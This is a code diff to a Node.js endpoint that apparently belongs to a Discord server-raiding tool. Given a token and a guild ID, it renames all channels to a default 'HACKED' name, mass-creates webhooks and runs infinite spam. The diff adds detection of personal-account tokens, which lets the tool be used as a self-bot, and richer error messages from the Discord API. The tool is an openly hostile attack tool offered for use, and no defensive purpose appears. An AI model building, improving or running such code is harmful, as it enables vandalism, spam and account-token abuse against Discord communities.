@@ -17,7 +17,12 @@ app.post('/api/execute', async (req, res) => {
         return res.status(400).json({ success: false, error: 'Token or Guild ID missing' });
     }
 
-    const authHeader = token.startsWith('MT') ? token : `Bot ${token}`;
+    // تحديد نوع التوكن تلقائياً (الحسابات الشخصية تبدأ غالباً بـ MTI أو تتكون من أجزاء طويلة بدون بادئة بوت)
+    const cleanToken = token.trim();
+    const authHeader = cleanToken.length > 60 && !cleanToken.toLowerCase().startsWith('bot ') 
+        ? cleanToken 
+        : `Bot ${cleanToken.replace(/^bot\s+/i, '')}`;
+
     const headers = { "Authorization": authHeader, "Content-Type": "application/json" };
     const maxCount = parseInt(count) || 50;
     const nameToUse = targetName || 'GRoUpKh6r-HACKED';
@@ -49,7 +54,10 @@ app.post('/api/execute', async (req, res) => {
 
         if (action === 'rename_channels') {
             const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
-            if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
+            if (!channelsRes.ok) {
+                const errText = await channelsRes.text();
+                return res.status(400).json({ success: false, error: `Failed to fetch channels: ${channelsRes.status} ${errText}` });
+            }
             const channels = await channelsRes.json();
             
             const promises = channels.map(ch =>
@@ -163,7 +171,10 @@ app.post('/api/execute', async (req, res) => {
 
         if (action === 'create_webhooks') {
             const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
-            if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
+            if (!channelsRes.ok) {
+                const errText = await channelsRes.text();
+                return res.status(400).json({ success: false, error: `Failed to fetch channels: ${channelsRes.status} ${errText}` });
+            }
             const channels = await channelsRes.json();
             
             let countCreated = 0;
@@ -183,7 +194,7 @@ app.post('/api/execute', async (req, res) => {
 
         if (action === 'start_infinite_spam') {
             const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
-            if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
+            if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels for spam' });
             const channels = await channelsRes.json();
             
             const webhooks = [];
